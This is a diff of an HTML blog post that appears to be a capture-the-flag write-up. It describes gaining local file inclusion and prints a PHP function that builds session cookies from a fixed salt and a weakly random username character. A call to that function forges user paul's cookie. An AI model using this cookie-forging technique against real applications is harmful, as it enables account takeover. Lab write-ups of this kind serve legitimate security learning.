@@ -47,12 +47,12 @@ published: true
 
 <img src="https://i.ibb.co/KqTmg1h/paul.png" alt="paul" border="0">
 
-<p>So now we got LFI , let`s start enumeration and see the source code</p>
+<p>So now we got LFI , Files.php says that we need to get paul session to login</p>
+<p>Let`s see how this application generates a cookie</p>
 
 <img src="https://i.ibb.co/G7KQwy8/7.png" alt="7" border="0">
 
-<p>So after seeing files.php, we should get paul session to login</p>
-<p>Let`s countinue our enumeration</p>
+
 
 
 <pre><span class="line">function makesession($username) {</span><br><span class="line"></span><br><span class="line">$max = strlen($username) - 1;</span><br><span class="line"></span><br><span class="line">$seed = rand(0, $max);</span><br><span class="line"></span><br><span class="line">$key = "s4lTy_stR1nG_".$username[$seed]."(!528.\/9890";</span><br><span class="line"></span><br><span class="line">$session_cookie = $username.md5($key);</span><br><span class="line"></span><br><span class="line">return $session_cookie;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">echo makesession("paul");</span>><br></pre>
